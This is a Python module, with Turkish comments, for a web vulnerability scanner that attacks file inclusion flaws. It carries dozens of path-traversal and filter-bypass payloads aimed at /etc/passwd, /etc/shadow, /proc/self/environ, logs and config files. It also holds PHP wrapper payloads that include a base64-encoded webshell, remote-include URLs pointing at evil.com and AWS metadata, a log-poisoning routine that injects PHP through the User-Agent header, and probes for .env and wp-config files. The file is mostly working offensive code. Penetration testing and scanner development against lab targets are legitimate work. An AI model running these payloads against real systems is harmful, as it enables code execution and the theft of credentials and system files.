#!/usr/bin/env python3
"""
Maxima Cog: LFI/RFI Scanner — v2 (Kurumsal Seviye)

Teknikler:
  - LFI — path traversal (70+ varyasyon, encoding, null byte, double encode)
  - PHP wrapper'ları: php://filter, php://input, data://, expect://, zip://
  - Log poisoning aday tespiti (access_log, error_log, auth.log)
  - Null byte injection (PHP 5.3 ve altı)
  - Double URL encoding bypass
  - Unicode/UTF-8 bypass (%c0%ae%c0%ae/, %e2%80%8a, vb.)
  - Windows path traversal (..\\ ../ kombinasyonları)
  - Path truncation (Windows uzun dosya adı)
  - RFI — harici URL dahil etme (http://, https://, //, ftp://)
  - RFI: PHP filter bypass ile
  - Dosya keşif (sensitive files: /etc/passwd, /proc/self/environ, web.config vb.)
  - Parametre keşfi: URL, form, path segment
  - Bağlam tespiti: PHP/JSP/ASP extension analizi
  - Gerçek hedef: DVWA Low/Medium/High, bWAPP, WebGoat uyumlu
"""

import re
import base64
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple
from utils.base_module import BaseModule, ModuleResult

# ── LFI imza tablosu ────────────────────────────────────────
LFI_SIGNATURES: Dict[str, List[str]] = {
    # Linux/Unix dosyaları
    "/etc/passwd":        ["root:x:", "root:0:0", "daemon:x:", "/bin/bash", "/bin/sh"],
    "/etc/shadow":        ["root:$", "!!:", "!*:"],
    "/etc/hosts":         ["127.0.0.1", "localhost"],
    "/etc/issue":         ["Ubuntu", "Debian", "CentOS", "Red Hat"],
    "/proc/self/environ": ["HTTP_USER_AGENT=", "DOCUMENT_ROOT=", "SERVER_ADDR="],
    "/proc/self/cmdline": ["php", "apache", "nginx"],
    "/proc/version":      ["Linux version", "gcc"],
    "/var/log/apache2/access.log": ["GET /", "POST /", "HTTP/1."],
    "/var/log/apache/access.log":  ["GET /", "POST /"],
    "/var/log/nginx/access.log":   ["GET /", "nginx"],
    "/var/log/auth.log":           ["sshd", "sudo", "pam"],
    # Windows dosyaları
    "win.ini":            ["[extensions]", "[fonts]", "[files]"],
    "boot.ini":           ["[boot loader]", "multi(0)", "\\WINDOWS"],
    "System32/drivers/etc/hosts": ["127.0.0.1", "localhost"],
    "windows/win.ini":    ["[extensions]"],
    "winnt/win.ini":      ["[extensions]"],
    # Web konfigürasyon
    "/etc/httpd/conf/httpd.conf":     ["ServerRoot", "DocumentRoot"],
    "/etc/apache2/apache2.conf":      ["ServerRoot", "DocumentRoot"],
    "/etc/nginx/nginx.conf":          ["worker_processes", "http {"],
    "web.config":                     ["<configuration>", "connectionStrings"],
    "WEB-INF/web.xml":                ["<web-app", "<servlet"],
    # PHP kaynak kod okuma
    "php://filter/convert.base64-encode/resource": [],  # b64 decode kontrol
}

# ── LFI payload üretici ──────────────────────────────────────
def _make_lfi_payloads() -> List[Tuple[str, str]]:
    """(payload, hedef_dosya) çiftleri döner."""
    payloads: List[Tuple[str, str]] = []

    targets = [
        ("../../../etc/passwd",             "/etc/passwd"),
        ("../../etc/passwd",                "/etc/passwd"),
        ("../../../../etc/passwd",          "/etc/passwd"),
        ("../../../../../etc/passwd",       "/etc/passwd"),
        ("../../../../../../etc/passwd",    "/etc/passwd"),
        ("../../../../../../../etc/passwd", "/etc/passwd"),
    ]

    for traversal, tgt in targets:
        payloads.append((traversal, tgt))

    # URL encoding varyasyonları
    encoded_variants = [
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",      "/etc/passwd"),
        ("%2e%2e/%2e%2e/%2e%2e/etc/passwd",               "/etc/passwd"),
        ("..%2f..%2f..%2fetc%2fpasswd",                   "/etc/passwd"),
        ("..%252f..%252f..%252fetc%252fpasswd",           "/etc/passwd"),   # double encode
        ("%252e%252e%252f%252e%252e%252fetc%252fpasswd",  "/etc/passwd"),
    ]
    payloads.extend(encoded_variants)

    # Unicode bypass
    payloads.extend([
        ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/etc/passwd"),
        ("%e2%80%8a../%e2%80%8a../etc/passwd",                 "/etc/passwd"),
    ])

    # Null byte (PHP 5.3-)
    payloads.extend([
        ("../../../etc/passwd\x00",          "/etc/passwd"),
        ("../../../etc/passwd%00",           "/etc/passwd"),
        ("../../../etc/passwd\x00.jpg",      "/etc/passwd"),
        ("../../../etc/passwd%00.html",      "/etc/passwd"),
    ])

    # Çift nokta bypass (filter evasion)
    payloads.extend([
        ("....//....//....//etc/passwd",           "/etc/passwd"),
        ("....\\\\....\\\\....\\\\etc/passwd",     "/etc/passwd"),
        ("..././..././..././etc/passwd",           "/etc/passwd"),
        (".../...//...//etc/passwd",               "/etc/passwd"),
    ])

    # Windows
    payloads.extend([
        ("..\\..\\..\\windows\\win.ini",           "win.ini"),
        ("..\\..\\..\\winnt\\win.ini",             "win.ini"),
        ("..\\..\\..\\..\\.\\windows\\win.ini",    "win.ini"),
        ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",    "win.ini"),
        ("....\\....\\....\\windows\\win.ini",     "win.ini"),
    ])

    # /proc/self/environ (log poisoning giriş noktası)
    payloads.extend([
        ("../../../proc/self/environ",             "/proc/self/environ"),
        ("../../proc/self/environ",                "/proc/self/environ"),
        ("%2e%2e%2fproc%2fself%2fenviron",         "/proc/self/environ"),
    ])

    # Log dosyaları (log poisoning hedefleri)
    log_files = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/var/log/syslog",
    ]
    depths = ["../../..", "../../../..", "../../../../.."]
    for depth in depths:
        for log in log_files:
            payloads.append((depth + log, log))

    # Web konfigürasyon
    web_configs = [
        "/etc/httpd/conf/httpd.conf",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/mysql/my.cnf",
    ]
    for cfg in web_configs:
        payloads.append(("../../.." + cfg, cfg))

    # PHP wrapper'ları
    php_wrappers = [
        ("php://filter/convert.base64-encode/resource=../../../etc/passwd",    "/etc/passwd"),
        ("php://filter/read=convert.base64-encode/resource=/etc/passwd",       "/etc/passwd"),
        ("php://filter/convert.base64-encode/resource=index.php",              "index.php"),
        ("php://filter/read=string.toupper/resource=/etc/passwd",              "/etc/passwd"),
        ("pHp://FilTer/convert.base64-encode/resource=/etc/passwd",            "/etc/passwd"),  # case bypass
        ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "data://"),
        ("expect://id",                                                          "expect://"),
        ("zip://shell.jpg%23shell.php",                                         "zip://"),
    ]
    payloads.extend(php_wrappers)

    return payloads

# ── RFI payload'ları ─────────────────────────────────────────
RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
    "//evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt%23",
    "http://evil.com/shell.txt%00",
    "\\\\evil.com\\shell.txt",      # Windows UNC
    "ftp://evil.com/shell.txt",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://127.0.0.1/etc/passwd",
    "http://[::]:80/etc/passwd",    # IPv6 loopback
]

# ── LFI için test parametreler ───────────────────────────────
LFI_PARAMS = [
    "file", "page", "path", "include", "doc", "lang", "template",
    "load", "read", "show", "display", "view", "content", "source",
    "fetch", "open", "import", "get", "module", "action", "layout",
    "name", "filename", "filepath", "resource", "document", "root",
    "dir", "folder", "base_dir", "base_path", "inc",
]


class LFIRFIScanner(BaseModule):
    """LFI/RFI Scanner v2 — 70+ payload, PHP wrapper, log poisoning, RFI"""

    def run(self) -> ModuleResult:
        self.log("LFI/RFI taraması v2 başlatılıyor...", "info")
        self.log("Path traversal, PHP wrapper, log poison, RFI, null byte, encoding bypass", "info")

        findings_before = len(self.results["findings"])

        # Teknoloji tespiti (PHP/JSP/ASP)
        tech = self._detect_tech()
        self.log(f"  Teknoloji: {tech or 'bilinmiyor'}", "info")

        # Parametre keşfi
        params = self._discover_params()
        self.log(f"  {len(params)} parametre keşfedildi", "info")

        # LFI payload listesi
        lfi_payloads = _make_lfi_payloads()
        self.log(f"  {len(lfi_payloads)} LFI payload, {len(RFI_PAYLOADS)} RFI payload", "info")

        # LFI testleri
        lfi_found = self._test_lfi(params, lfi_payloads)

        # PHP wrapper testi (sadece PHP)
        if tech in ("php", "unknown"):
            self._test_php_wrappers(params)

        # Log poisoning tespiti
        self._test_log_poisoning(params)

        # RFI testleri
        rfi_found = self._test_rfi(params)

        # Hassas dosya keşfi (path traversal olmadan doğrudan)
        self._test_direct_access()

        total = len(self.results["findings"]) - findings_before
        self.results["summary"].update({
            "Taranan Parametre": len(params),
            "LFI Payload Sayısı": len(lfi_payloads),
            "LFI Bulgu":         lfi_found,
            "RFI Bulgu":         rfi_found,
            "Toplam Bulgu":      total,
            "Teknoloji":         tech or "Bilinmiyor",
        })
        return self.results

    # ── Teknoloji tespiti ────────────────────────────────────
    def _detect_tech(self) -> str:
        try:
            resp = self.http_get(self.url)
            headers = {k.lower(): v.lower() for k, v in resp.get("headers", {}).items()}
            server = headers.get("server", "")
            powered = headers.get("x-powered-by", "")
            url_lower = self.url.lower()
            if "php" in powered or ".php" in url_lower:
                return "php"
            if "asp" in server or ".asp" in url_lower or ".aspx" in url_lower:
                return "asp"
            if "java" in server or ".jsp" in url_lower or ".do" in url_lower:
                return "jsp"
            if "python" in server or ".py" in url_lower:
                return "python"
            if "ruby" in server or ".rb" in url_lower:
                return "ruby"
        except Exception:
            pass
        return "unknown"

    # ── Parametre keşfi ──────────────────────────────────────
    def _discover_params(self) -> List[str]:
        params: List[str] = list(LFI_PARAMS)
        seen = set(params)
        try:
            resp = self.http_get(self.url)
            body = resp.get("body", "")
            parsed = urllib.parse.urlparse(self.url)
            for k, _ in urllib.parse.parse_qsl(parsed.query):
                if k not in seen:
                    params.insert(0, k)
                    seen.add(k)
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.I):
                name = m.group(1)
                if name not in seen and name.lower() not in ("submit", "csrf", "_token"):
                    params.append(name)
                    seen.add(name)
        except Exception:
            pass
        return params[:20]

    # ── LFI testi ────────────────────────────────────────────
    def _test_lfi(self, params: List[str], lfi_payloads: List[Tuple[str, str]]) -> int:
        found = 0
        reported_params: Set[str] = set()

        # Paralel GET: (param, payload) kombinasyonları
        # İlk 8 param × ilk 30 payload = 240 istek
        test_params = params[:8]
        test_payloads = lfi_payloads[:30]

        combos: List[Tuple[str, str, str]] = []
        for param in test_params:
            for payload, target_file in test_payloads:
                url = self._build_url(param, payload)
                combos.append((url, param, target_file))

        urls = [c[0] for c in combos]
        url_to_meta = {c[0]: (c[1], c[2]) for c in combos}

        for url, resp in self.parallel_get(urls, max_workers=15):
            param, target_file = url_to_meta.get(url, ("?", "?"))
            if param in reported_params:
                continue

            body = resp.get("body", "")
            if not body:
                continue

            # İmza eşleşmesi
            matched_sig, matched_file = self._check_lfi_signatures(body)
            if matched_sig:
                is_php_wrapper = "php://" in url or "data://" in url
                severity = "critical" if not is_php_wrapper else "high"
                self.add_finding(
                    f"LFI — Path Traversal Başarılı",
                    f"Param:{param} | Hedef:{matched_file} | İmza:\"{matched_sig}\" | "
                    f"Payload:{urllib.parse.unquote(url.split('=',1)[-1])[:80]}",
                    severity
                )
                self.log(f"[CRITICAL] LFI: {param} → {matched_file}", "finding")
                reported_params.add(param)
                found += 1

                # base64 decode kontrol (php://filter)
                if "php://" in url:
                    self._check_base64_lfi(param, body)
                continue

            # /proc/self/environ içeriği
            if "HTTP_USER_AGENT=" in body or "DOCUMENT_ROOT=" in body:
                self.add_finding(
                    "LFI — /proc/self/environ Okundu!",
                    f"Param:{param} | Ortam değişkenleri sızdı — Log Poisoning mümkün",
                    "critical"
                )
                reported_params.add(param)
                found += 1

        # Kalan param'lar için derin payload test (paralel olmadan)
        remaining_params = [p for p in params[8:12] if p not in reported_params]
        for param in remaining_params:
            for payload, target_file in lfi_payloads[30:60]:
                try:
                    resp = self.http_get(self._build_url(param, payload))
                    body = resp.get("body", "")
                    sig, fle = self._check_lfi_signatures(body)
                    if sig and param not in reported_params:
                        self.add_finding(
                            "LFI — Path Traversal Başarılı",
                            f"Param:{param} | Hedef:{fle} | İmza:\"{sig}\"",
                            "critical"
                        )
                        reported_params.add(param)
                        found += 1
                        break
                except Exception:
                    continue

        return found

    def _build_url(self, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        if parsed.query:
            return parsed._replace(query=urllib.parse.urlencode(qs)).geturl()
        return self.url.rstrip("?") + "?" + urllib.parse.urlencode({param: payload})

    def _check_lfi_signatures(self, body: str) -> Tuple[str, str]:
        for target_file, sigs in LFI_SIGNATURES.items():
            if not sigs:
                continue
            for sig in sigs:
                if sig in body:
                    return sig, target_file
        return "", ""

    def _check_base64_lfi(self, param: str, body: str):
        """php://filter base64 çıktısını decode et ve kaynak kodu kontrol et."""
        b64_match = re.search(r'([A-Za-z0-9+/]{40,}={0,2})', body)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="replace")
                if "<?php" in decoded or "<?=" in decoded:
                    self.add_finding(
                        "LFI — PHP Kaynak Kodu Sızdı (php://filter)",
                        f"Param:{param} | Base64 decode ile PHP kaynak kodu elde edildi | "
                        f"Preview: {decoded[:100]}",
                        "critical"
                    )
            except Exception:
                pass

    # ── PHP wrapper testi ────────────────────────────────────
    def _test_php_wrappers(self, params: List[str]):
        """PHP özel stream wrapper'ları test et."""
        wrappers = [
            ("php://filter/convert.base64-encode/resource=index.php", "index.php"),
            ("php://filter/convert.base64-encode/resource=../index.php", "index.php"),
            ("php://filter/read=convert.base64-encode/resource=config.php", "config.php"),
            ("php://filter/convert.base64-encode/resource=../config.php", "config.php"),
            ("php://filter/convert.base64-encode/resource=../includes/config.php", "config.php"),
            ("data://text/plain,<?php phpinfo(); ?>", "phpinfo"),
            ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "phpinfo (base64)"),
        ]

        for param in params[:5]:
            for wrapper, description in wrappers:
                try:
                    resp = self.http_get(self._build_url(param, wrapper))
                    body = resp.get("body", "")
                    if not body:
                        continue

                    # Base64 çıktısı
                    b64_match = re.search(r'([A-Za-z0-9+/]{60,}={0,2})', body)
                    if b64_match:
                        decoded = base64.b64decode(b64_match.group(1) + "==").decode("utf-8", errors="replace")
                        if "<?php" in decoded or "<?=" in decoded or "mysql" in decoded.lower():
                            self.add_finding(
                                f"LFI PHP Wrapper — php://filter Başarılı",
                                f"Param:{param} | Hedef:{description} | PHP kodu elde edildi | "
                                f"Preview: {decoded[:120]}",
                                "critical"
                            )
                            return

                    # data:// → phpinfo çalıştı mı?
                    if "data://" in wrapper and "PHP Version" in body:
                        self.add_finding(
                            "LFI PHP Wrapper — data:// RCE (phpinfo çalıştı!)",
                            f"Param:{param} | data:// wrapper PHP kodu çalıştırdı",
                            "critical"
                        )
                        return

                except Exception:
                    continue

    # ── Log poisoning tespiti ────────────────────────────────
    def _test_log_poisoning(self, params: List[str]):
        """
        /proc/self/environ veya log dosyalarına User-Agent üzerinden PHP kodu enjekte et.
        Gerçek pentest adımı: önce log dosyasını oku, sonra User-Agent'a PHP yerleştir.
        """
        log_paths = [
            ("../../../proc/self/environ",          "/proc/self/environ"),
            ("../../proc/self/environ",             "/proc/self/environ"),
            ("../../../var/log/apache2/access.log", "apache2 access.log"),
            ("../../../var/log/apache/access.log",  "apache access.log"),
            ("../../../var/log/nginx/access.log",   "nginx access.log"),
        ]

        marker = "MAXIMALOGTEST"
        poisoned_ua = f"Mozilla/5.0 <?php echo '{marker}'; ?>"

        for param in params[:4]:
            for log_payload, log_name in log_paths:
                try:
                    # 1. Log dosyasına PHP kodu enjekte et (User-Agent üzerinden)
                    self.http_get(self.url, headers={"User-Agent": poisoned_ua})

                    # 2. Log dosyasını oku
                    resp = self.http_get(
                        self._build_url(param, log_payload),
                        headers={"User-Agent": "MaximaRecon/2.0"}
                    )
                    body = resp.get("body", "")

                    if marker in body:
                        self.add_finding(
                            "LFI + Log Poisoning — PHP RCE!",
                            f"Param:{param} | Log:{log_name} | "
                            f"PHP kodu User-Agent üzerinden execute edildi!",
                            "critical"
                        )
                        self.log(f"[CRITICAL] Log poisoning RCE: {log_name}", "finding")
                        return

                    # Log okunuyor ama PHP çalışmıyor → aday
                    if any(s in body for s in ["GET /", "POST /", "HTTP_USER_AGENT"]):
                        self.add_finding(
                            "LFI Log Okuma — Poisoning Riski",
                            f"Param:{param} | {log_name} okunuyor — User-Agent PHP enjeksiyonu riski",
                            "high"
                        )
                        return

                except Exception:
                    continue

    # ── RFI testi ────────────────────────────────────────────
    def _test_rfi(self, params: List[str]) -> int:
        found = 0
        reported: Set[str] = set()

        combos = [(p, pl) for p in params[:8] for pl in RFI_PAYLOADS]
        urls = [self._build_url(p, pl) for p, pl in combos]
        url_to_param = {self._build_url(p, pl): p for p, pl in combos}

        for url, resp in self.parallel_get(urls, max_workers=10):
            param = url_to_param.get(url, "?")
            if param in reported:
                continue
            body = resp.get("body", "")
            status = resp.get("status", 0)

            # AWS metadata başarılı döndü
            if "ami-id" in body or "instance-id" in body or "iam" in body.lower():
                self.add_finding(
                    "SSRF → AWS Metadata Erişimi (RFI Vektörü)",
                    f"Param:{param} | AWS EC2 metadata elde edildi! IMDSv2 aktif değil",
                    "critical"
                )
                reported.add(param)
                found += 1
                continue

            # PHP shell çalıştırma işareti
            if "<?php" in body and "evil.com" in url:
                self.add_finding(
                    "RFI — Uzak Dosya Dahil Etme Başarılı!",
                    f"Param:{param} | evil.com içeriği PHP olarak işlendi",
                    "critical"
                )
                reported.add(param)
                found += 1
                continue

            # HTTP 200 + harici URL → aday
            if status == 200 and any(rfi in url for rfi in ["evil.com", "169.254"]):
                # Body baseline'a benziyor mu?
                baseline_resp = self.http_get(self._build_url(param, "test"))
                baseline_len = len(baseline_resp.get("body", ""))
                if abs(len(body) - baseline_len) > 200:
                    self.add_finding(
                        "RFI Aday — Uzak URL Yanıtı Farklı (Manuel Doğrulama)",
                        f"Param:{param} | URL:{url.split('=')[-1][:60]} | "
                        f"Yanıt boyutu baseline'dan farklı",
                        "medium"
                    )
                    reported.add(param)
                    found += 1

        return found

    # ── Doğrudan hassas dosya erişim testi ──────────────────
    def _test_direct_access(self):
        """Path traversal olmadan doğrudan hassas dosyalara erişim."""
        parsed = urllib.parse.urlparse(self.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        sensitive_paths = [
            "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
            "/config.php", "/config.php.bak", "/config.inc.php",
            "/configuration.php", "/settings.php", "/database.php",
            "/.htpasswd", "/.htaccess",
            "/web.config", "/Web.config",
            "/WEB-INF/web.xml", "/WEB-INF/applicationContext.xml",
            "/server-status", "/server-info",
            "/phpinfo.php", "/info.php", "/php_info.php",
            "/adminer.php", "/phpmyadmin/", "/pma/",
            "/backup.sql", "/backup.zip", "/dump.sql",
            "/composer.json", "/package.json", "/Gemfile",
            "/.DS_Store", "/thumbs.db",
        ]

        urls = [base + path for path in sensitive_paths]
        for url, resp in self.parallel_get(urls, max_workers=15):
            body = resp.get("body", "")
            status = resp.get("status", 0)
            path = url.replace(base, "")

            if status not in (200, 403):
                continue

            # Sızdırıcı içerik kontrolü
            leak_sigs = {
                "/.git/HEAD":     ("ref: refs/", "Git deposu"),
                "/.env":          ("DB_PASSWORD=", ".env kimlik bilgileri"),
                "/wp-config.php": ("DB_PASSWORD", "WordPress DB şifresi"),
                "/config.php":    (("DB_PASS", "password", "dbpass"), "PHP konfigürasyon"),
                "/.htpasswd":     (":", ".htpasswd kullanıcı dosyası"),
                "/web.config":    ("<connectionString", "ASP.NET bağlantı bilgisi"),
                "/WEB-INF/web.xml": ("<web-app", "Java web.xml"),
                "/phpinfo.php":   ("PHP Version", "phpinfo açık"),
                "/backup.sql":    (("CREATE TABLE", "INSERT INTO"), "SQL yedek dosyası"),
            }

            for check_path, (sig, desc) in leak_sigs.items():
                if path.endswith(check_path.lstrip("/")):
                    sigs = (sig,) if isinstance(sig, str) else sig
                    if any(s in body for s in sigs):
                        self.add_finding(
                            f"Hassas Dosya Açık: {path}",
                            f"{desc} web üzerinden erişilebilir | HTTP {status}",
                            "critical" if any(k in path for k in [".env", "config", ".git", "sql"]) else "high"
                        )
                        break
                    elif status == 200 and path in ("/.git/HEAD", "/.env"):
                        self.add_finding(
                            f"Hassas Yol Erişilebilir: {path}",
                            f"HTTP 200 döndü — içerik kontrol edilmeli",
                            "medium"
                        )
                        break
